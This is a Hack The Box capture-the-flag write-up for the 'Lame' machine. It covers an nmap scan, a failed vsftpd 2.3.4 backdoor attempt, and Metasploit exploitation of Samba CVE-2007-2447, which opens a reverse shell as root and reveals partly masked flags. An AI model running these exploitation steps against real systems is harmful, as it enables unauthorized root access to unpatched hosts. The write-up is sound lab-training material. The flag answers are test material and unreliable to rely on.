---
title: Lame
date: 2025-12-8 10:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, lame ]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/fb2d9f98400e3c802a0d7145e125c4ff.png
    alt: Hack The Box
---

> Lame
Linux · Easy 

## Task 1
How many of the nmap top 1000 TCP ports are open on the remote host?

``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ nmap     10.129.8.137 -sVC -vv -p- -T 5 --min-rate 500 

Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 20:52 CET
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Scanning 10.129.8.137 [65535 ports]
Discovered open port 445/tcp on 10.129.8.137
Discovered open port 21/tcp on 10.129.8.137
Discovered open port 22/tcp on 10.129.8.137
Discovered open port 139/tcp on 10.129.8.137
SYN Stealth Scan Timing: About 26.11% done; ETC: 20:54 (0:01:28 remaining)
SYN Stealth Scan Timing: About 58.18% done; ETC: 20:54 (0:00:44 remaining)
Discovered open port 3632/tcp on 10.129.8.137
Nmap scan report for 10.129.8.137
Host is up, received echo-reply ttl 63 (0.042s latency).
Scanned at 2025-12-08 20:53:00 CET for 147s
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.15.224
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALz4hsc8a2Srq4nlW960qV8xwBG0JC+jI7fWxm5METIJH4tKr/xUTwsTYEYnaZLzcOiy21D3ZvOwYb6AA3765zdgCd2Tgand7F0YD5UtXG7b7fbz99chReivL0SIWEG/E96Ai+pqYMP2WD5KaOJwSIXSUajnU5oWmY5x85sBw+XDAAAAFQDFkMpmdFQTF+oRqaoSNVU7Z+hjSwAAAIBCQxNKzi1TyP+QJIFa3M0oLqCVWI0We/ARtXrzpBOJ/dt0hTJXCeYisKqcdwdtyIn8OUCOyrIjqNuA2QW217oQ6wXpbFh+5AQm8Hl3b6C6o8lX3Ptw+Y4dp0lzfWHwZ/jzHwtuaDQaok7u1f971lEazeJLqfiWrAzoklqSWyDQJAAAAIA1lAD3xWYkeIeHv/R3P9i+XaoI7imFkMuYXCDTq843YU6Td+0mWpllCqAWUV/CQamGgQLtYy5S0ueoks01MoKdOMMhKVwqdr08nvCBdNKjIEd3gH6oBk/YRnjzxlEAYBsvCmM4a0jmhz0oNiRWlc/F+bkUeFKrBx/D2fdfZmhrGg==
|   2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     syn-ack ttl 63 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h30m38s, deviation: 3h32m11s, median: 35s
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2025-12-08T14:55:28-05:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 41087/tcp): CLEAN (Timeout)
|   Check 2 (port 11342/tcp): CLEAN (Timeout)
|   Check 3 (port 51621/udp): CLEAN (Timeout)
|   Check 4 (port 46954/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb2-security-mode: Couldn't establish a SMBv2 connection.

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:55
Completed NSE at 20:55, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:55
Completed NSE at 20:55, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:55
Completed NSE at 20:55, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 160.57 seconds
           Raw packets sent: 131142 (5.770MB) | Rcvd: 71 (3.108KB)
``` 
> 4

## Task 2

What version of VSFTPd is running on Lame?

> 2.3.4

## Task 3

There is a famous backdoor in VSFTPd version 2.3.4, and a Metasploit module to exploit it. Does that exploit work here?


``` shell
msf exploit(unix/ftp/vsftpd_234_backdoor) > run
[*] 10.129.8.137:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.129.8.137:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```
Probamos dicho exploit pero no funciona

> no

## Task 4

What version of Samba is running on Lame? Give the numbers up to but not including "-Debian".

> 3.0.20

## Task 5

What 2007 CVE allows for remote code execution in this version of Samba via shell metacharacters involving the SamrChangePassword function when the "username map script" option is enabled in smb.conf?

[https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2007-2447](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2007-2447)

> CVE-2007-2447

## Task 6 

Exploiting CVE-2007-2447 returns a shell as which user?

``` shell
msf exploit(multi/samba/usermap_script) > run
[*] Started reverse TCP handler on 10.10.15.224:4444 
[*] Command shell session 1 opened (10.10.15.224:4444 -> 10.129.8.137:54695) at 2025-12-08 21:09:56 +0100

whoami
root
```

> root

## Submit the flag located in the makis user's home directory.

``` shell
root@lame:/home/makis# cat user.txt
cat user.txt
24870eb7eaca53bb************
```
> 24870eb7eaca53bb************

## Submit the flag located in root's home directory.

``` shell
root@lame:/root# cat root.txt
cat root.txt
b7a5a07988036a82************
```

> b7a5a07988036a8************

[achivement](https://labs.hackthebox.com/achievement/machine/2336390/1)


## Task 9

We'll explore a bit beyond just getting a root shell on the box. While the official writeup doesn't cover this, you can look at 0xdf's write-up for more details. With a root shell, we can look at why the VSFTPd exploit failed. Our initial nmap scan showed four open TCP ports. Running netstat -tnlp shows many more ports listening, including ones on 0.0.0.0 and the boxes external IP, so they should be accessible. What must be blocking connection to these ports?

> firewall

## Task 10

When the VSFTPd backdoor is trigger, what port starts listening?

Esta tarea es opcional y cuando hice un iptables -F (flush de reglas), se quedo inaccesible. Quizás lo intente en el futuro. 

## Task 11

TODO